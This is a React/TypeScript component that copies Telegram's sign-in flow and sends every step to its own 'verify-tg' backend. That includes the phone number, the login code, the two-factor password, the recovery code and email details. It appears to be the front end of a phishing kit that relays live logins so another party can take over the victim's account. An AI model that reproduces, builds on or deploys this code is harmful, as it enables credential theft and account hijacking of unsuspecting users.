import { useEffect, useRef, useState } from "react";
import type { AuthResponse, CodeDelivery } from "@/verify-tg/lib/types";
import { authRequest, LOGIN_KEY } from "@/verify-tg/lib/auth-client";
import { detectLocale, errorText, t, type Locale } from "@/verify-tg/lib/i18n";
import { BackIcon } from "./icons";
import { PhoneStep } from "./PhoneStep";
import { CodeStep } from "./CodeStep";
import { CaptchaStep, EmailCodeStep, EmailStep, PasswordStep, RegisterStep } from "./AccountSteps";
import { AlertDialog, RichText } from "./ui";

type Screen =
  | { name: "phone" }
  | { name: "code"; delivery: CodeDelivery; errorCode?: string }
  | { name: "password"; hint?: string; errorText?: string }
  | { name: "signup" }
  | { name: "email" }
  | { name: "email_code"; emailPattern?: string; length: number }
  | { name: "captcha"; siteKey: string };

type AlertState = {
  title?: string;
  message: string;
  primary: string;
  secondary?: string;
  onSecondary?: () => void;
};

export function TgVerifyLogin({ onSuccess }: { onSuccess: () => void }) {
  const [booting, setBooting] = useState(true);
  const [locale, setLocale] = useState<Locale>("en");
  const [screen, setScreen] = useState<Screen>({ name: "phone" });
  const [loading, setLoading] = useState(false);
  const [sentPhone, setSentPhone] = useState("+1 555 000 0000");
  const [errorToken, setErrorToken] = useState(0);
  const [alert, setAlert] = useState<AlertState | null>(null);
  const [terms, setTerms] = useState<string | null>(null);
  const [recovery, setRecovery] = useState<{ pattern: string; code: string } | null>(null);
  const [nested, setNested] = useState(false);
  const loginId = useRef<string | null>(null);
  const backRef = useRef<() => boolean>(() => false);
  const localeRef = useRef<Locale>("fa");
  const handleBackRef = useRef<() => void>(() => {});

  function remember(result: AuthResponse) {
    if ("loginId" in result && result.loginId) {
      loginId.current = result.loginId;
      sessionStorage.setItem(LOGIN_KEY, result.loginId);
    }
  }

  function showError(code?: string, message?: string) {
    const current = localeRef.current;
    setAlert({
      title: t(current, "sorry"),
      message: errorText(current, code, message),
      primary: t(current, "ok"),
    });
    if (code === "SESSION_LOST" || code === "PHONE_CODE_EXPIRED" || code === "TIMEOUT") {
      loginId.current = null;
      sessionStorage.removeItem(LOGIN_KEY);
      setScreen({ name: "phone" });
    }
  }

  function apply(result: AuthResponse) {
    remember(result);
    switch (result.step) {
      case "code":
        setScreen({ name: "code", delivery: result.delivery, errorCode: result.errorCode });
        if (result.errorCode) setErrorToken((value) => value + 1);
        break;
      case "password":
        setScreen({
          name: "password",
          hint: result.hint,
          errorText: result.errorCode ? errorText(localeRef.current, result.errorCode) : undefined,
        });
        if (result.errorCode) setErrorToken((value) => value + 1);
        break;
      case "signup":
        setScreen({ name: "signup" });
        break;
      case "terms":
        setTerms(result.terms);
        break;
      case "email":
        setScreen({ name: "email" });
        break;
      case "email_code":
        setScreen({
          name: "email_code",
          emailPattern: result.emailPattern,
          length: result.length || 6,
        });
        if (result.errorCode) setErrorToken((value) => value + 1);
        break;
      case "captcha":
        setScreen({ name: "captcha", siteKey: result.siteKey });
        break;
      case "done":
        sessionStorage.removeItem(LOGIN_KEY);
        loginId.current = null;
        onSuccess();
        break;
      case "phone":
        setScreen({ name: "phone" });
        break;
      case "error":
        showError(result.code, result.message);
        break;
      default:
        break;
    }
  }

  async function request(body: Record<string, unknown>) {
    setLoading(true);
    try {
      const result = await authRequest(body);
      apply(result);
      return result;
    } catch {
      showError("GENERIC");
      return null;
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => {
    let alive = true;
    void (async () => {
      const nextLocale = detectLocale(navigator.language);
      localeRef.current = nextLocale;
      setLocale(nextLocale);
      document.documentElement.style.setProperty("--dpr", String(window.devicePixelRatio || 2));

      const pending = sessionStorage.getItem(LOGIN_KEY);
      if (pending) {
        const result = await authRequest({ action: "state", loginId: pending });
        if (!alive) return;
        if (result.step !== "error" && result.step !== "phone") {
          apply(result);
          setBooting(false);
          return;
        }
        sessionStorage.removeItem(LOGIN_KEY);
      }
      setBooting(false);
    })();
    return () => {
      alive = false;
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  function handleBack() {
    if (backRef.current()) return;
    if (terms) {
      void answerTerms(false);
      return;
    }
    if (recovery) {
      setRecovery(null);
      return;
    }
    if (alert) {
      setAlert(null);
      return;
    }
    if (screen.name !== "phone") void leaveLogin();
  }
  handleBackRef.current = handleBack;

  async function leaveLogin() {
    const id = loginId.current;
    loginId.current = null;
    sessionStorage.removeItem(LOGIN_KEY);
    setScreen({ name: "phone" });
    setTerms(null);
    setRecovery(null);
    if (id) await authRequest({ action: "cancel", loginId: id });
  }

  async function answerTerms(accept: boolean) {
    setTerms(null);
    if (!accept) {
      await leaveLogin();
      return;
    }
    await request({ action: "terms", loginId: loginId.current, accept: true });
  }

  const showBack = !nested && screen.name !== "phone";

  return (
    <div className="login-root flex h-full min-h-0 justify-center" data-theme="light" dir="ltr">
      <div className="relative flex h-full min-h-0 w-full flex-col overflow-hidden bg-[var(--tg-bg)]">
        {showBack ? (
          <button
            type="button"
            onClick={handleBack}
            className="absolute z-30 flex h-8 w-8 items-center justify-center p-1 text-[var(--tg-text)]"
            style={{ top: "calc(16px + var(--safe-top))", insetInlineStart: 16 }}
            aria-label="Back"
          >
            <BackIcon />
          </button>
        ) : null}

        {booting ? (
          <div className="flex flex-1 items-center justify-center">
            <span className="h-8 w-8 animate-spin rounded-full border-2 border-[var(--tg-line)] border-t-[var(--tg-fab)]" />
          </div>
        ) : screen.name === "phone" ? (
          <PhoneStep
            locale={locale}
            loading={loading}
            backRef={backRef}
            onNested={setNested}
            onSubmit={(phone, pretty) => {
              setSentPhone(pretty);
              void request({ action: "phone", phone, locale });
            }}
          />
        ) : screen.name === "code" ? (
          <CodeStep
            locale={locale}
            phone={sentPhone}
            delivery={screen.delivery}
            errorToken={errorToken}
            errorCode={screen.errorCode}
            loading={loading}
            onWrongNumber={() => void leaveLogin()}
            onHelp={() =>
              setAlert({
                title: t(locale, "helpTitle"),
                message: t(locale, "helpText", { phone: sentPhone }),
                primary: t(locale, "ok"),
              })
            }
            onResend={() => void request({ action: "resend", loginId: loginId.current })}
            onSubmit={(code) => void request({ action: "code", loginId: loginId.current, code })}
          />
        ) : screen.name === "password" ? (
          <PasswordStep
            locale={locale}
            hint={screen.hint}
            errorToken={errorToken}
            errorText={screen.errorText}
            loading={loading}
            onSubmit={(password) => void request({ action: "password", loginId: loginId.current, password })}
            onForgot={() => {
              void (async () => {
                setLoading(true);
                try {
                  const result = await authRequest({ action: "forgot", loginId: loginId.current });
                  if (result.step === "recovery_sent") setRecovery({ pattern: result.emailPattern, code: "" });
                  else if (result.step === "error") {
                    setAlert({
                      title: t(locale, "sorry"),
                      message: result.code?.startsWith("FLOOD_WAIT") ? errorText(locale, result.code) : t(locale, "noEmail"),
                      primary: t(locale, "close"),
                      secondary: t(locale, "resetAccount"),
                      onSecondary: () =>
                        setAlert({
                          title: t(locale, "sorry"),
                          message: t(locale, "resetUnavailable"),
                          primary: t(locale, "ok"),
                        }),
                    });
                  }
                } finally {
                  setLoading(false);
                }
              })();
            }}
          />
        ) : screen.name === "signup" ? (
          <RegisterStep
            locale={locale}
            loading={loading}
            onSubmit={(firstName, lastName) =>
              void request({ action: "signup", loginId: loginId.current, firstName, lastName })
            }
          />
        ) : screen.name === "email" ? (
          <EmailStep
            locale={locale}
            loading={loading}
            onSubmit={(email) => void request({ action: "email", loginId: loginId.current, email })}
          />
        ) : screen.name === "email_code" ? (
          <EmailCodeStep
            locale={locale}
            emailPattern={screen.emailPattern}
            length={screen.length}
            errorToken={errorToken}
            loading={loading}
            onSubmit={(code) => void request({ action: "email_code", loginId: loginId.current, code })}
          />
        ) : screen.name === "captcha" ? (
          <CaptchaStep
            locale={locale}
            siteKey={screen.siteKey}
            onToken={(token) => {
              void request({ action: "captcha", loginId: loginId.current, token });
            }}
          />
        ) : null}

        {terms ? (
          <div className="absolute inset-0 z-40 flex items-center justify-center bg-black/40 px-5">
            <div className="max-h-[80%] w-full max-w-[360px] overflow-y-auto rounded-[10px] bg-[var(--tg-dialog)] px-6 pt-5 pb-3">
              <h2 className="text-[19px] font-bold">{t(locale, "terms")}</h2>
              <p className="mt-3 text-[15px] leading-6 whitespace-pre-wrap">{terms}</p>
              <div className="mt-4 flex justify-end gap-1">
                <button type="button" onClick={() => void answerTerms(false)} className="px-3 py-2 text-[15px] font-medium text-[var(--tg-link)]">
                  {t(locale, "decline")}
                </button>
                <button type="button" onClick={() => void answerTerms(true)} className="px-3 py-2 text-[15px] font-medium text-[var(--tg-link)]">
                  {t(locale, "accept")}
                </button>
              </div>
            </div>
          </div>
        ) : null}

        {recovery ? (
          <form
            className="absolute inset-0 z-40 flex items-center justify-center bg-black/40 px-5"
            onSubmit={(event) => {
              event.preventDefault();
              if (!recovery.code.trim()) return;
              void (async () => {
                const code = recovery.code.trim();
                setRecovery(null);
                await request({ action: "recover", loginId: loginId.current, code });
              })();
            }}
          >
            <div className="w-full max-w-[360px] rounded-[10px] bg-[var(--tg-dialog)] px-6 pt-5 pb-3">
              <h2 className="text-[19px] font-bold">{t(locale, "recoveryTitle")}</h2>
              <div className="mt-3 text-[15px] leading-6">
                <RichText text={t(locale, "recoverySent", { email: recovery.pattern })} />
              </div>
              <input
                value={recovery.code}
                autoFocus
                inputMode="numeric"
                onChange={(event) => setRecovery({ ...recovery, code: event.target.value })}
                className="mt-4 w-full border-b-2 border-[var(--tg-blue)] bg-transparent py-2 text-[18px] outline-none"
              />
              <div className="mt-4 flex justify-end">
                <button type="button" onClick={() => setRecovery(null)} className="px-3 py-2 text-[15px] font-medium text-[var(--tg-link)]">
                  {t(locale, "close")}
                </button>
                <button type="submit" className="px-3 py-2 text-[15px] font-medium text-[var(--tg-link)]">
                  {t(locale, "continue")}
                </button>
              </div>
            </div>
          </form>
        ) : null}

        {alert ? (
          <AlertDialog
            title={alert.title}
            message={alert.message}
            primary={alert.primary}
            secondary={alert.secondary}
            onPrimary={() => setAlert(null)}
            onSecondary={alert.onSecondary}
          />
        ) : null}
      </div>
    </div>
  );
}
